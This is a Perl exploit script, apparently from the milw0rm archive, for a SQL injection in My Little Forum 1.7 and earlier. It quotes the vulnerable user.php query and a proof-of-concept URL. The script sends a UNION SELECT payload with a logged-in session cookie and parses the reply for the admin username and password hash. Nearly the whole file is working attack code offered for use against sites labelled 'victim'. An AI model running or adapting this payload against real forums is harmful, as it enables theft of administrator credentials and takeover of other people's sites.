#!/usr/bin/perl -w

#################################################################################
#										#
#	      	  My Little Forum <= 1.7 SQL Injection Exploit			#
#										#
# Discovered by: Silentz							#
# Payload: Admin Username & Hash Retrieval					#
# Website: http://www.w4ck1ng.com						#
# 										#
# Vulnerable Code (user.php):	 						#
#										#
#   if (isset($_GET['id'])) $id = $_GET['id'];					#
#										#
#   switch ($action)								#
#   {										#
#   case "get userdata":							#
#   if (empty($id)) $id = $user_id;						#
#   else $result = mysql_query("SELECT user_id, user_type, user_name, 		#
#   user_real_name, user_email, hide_email, user_hp, user_place, signature, 	#
#   profile, UNIX_TIMESTAMP(registered + INTERVAL ".$time_difference." HOUR) AS #
#   since_date FROM ".$db_settings['userdata_table']." WHERE user_id = 		#
#   '".$id."'", $connid);							#
#										#
# PoC: http://victim.com/forum/user.php?id=-999' UNION SELECT 0,0,user_name,	#
#      user_pw,0,0,0,0,0,0,0 FROM forum_userdata where user_id=1 /*		#
#										#
# 										#
# Subject To: magic_quotes_gpc set of off & having an already existant account	#
#										#
# GoogleDork: Get your own!							#
# Shoutz: The entire w4ck1ng community						#
#										#
# Notes: You need to obtain your current Session Identifier. Variables $page, 	#
#        $descasc and $order may also be exploitable.				#
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV < 2){
print "-------------------------------------------------------------------------\r\n";
print "           	   My Little Forum <= 1.7 SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_mylittleforum.pl [PATH] [SESSION_ID]\r\n\r\n";
print "[PATH] = Path where My Little Forum is located\r\n";
print "[SESSION_ID] = Session identifier of logged on user\r\n\r\n";
print "e.g. w4ck1ng_mylittleforum.pl http://victim.com/forum/ cjjjauie95inbmo5fim8m93vo1\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
exit();
}

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$cookie = "$ARGV[1];";
$host = $ARGV[0] . "user.php?id=-999' UNION SELECT 0,0,user_name,user_pw,0,0,0,0,0,0,0 FROM forum_userdata where user_id=1 /*";

my @cookie = ('Cookie' => "PHPSESSID=$cookie;");
my $res = $b->get($host, @cookie);

$answer = $res->content;
if ($answer =~ /<h2>User info: (.*?)<\/h2>/){
print "-------------------------------------------------------------------------\r\n";
print "           	   My Little Forum <= 1.7 SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "[+] Admin User : $1\n";
}

if ($answer =~/<p class="userdata">([0-9a-fA-F]{32})<\/p><\/td>/){
print "[+] Admin Hash : $1\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
}

else {
  print "\nExploit Failed...\n";
}

# milw0rm.com [2007-05-25]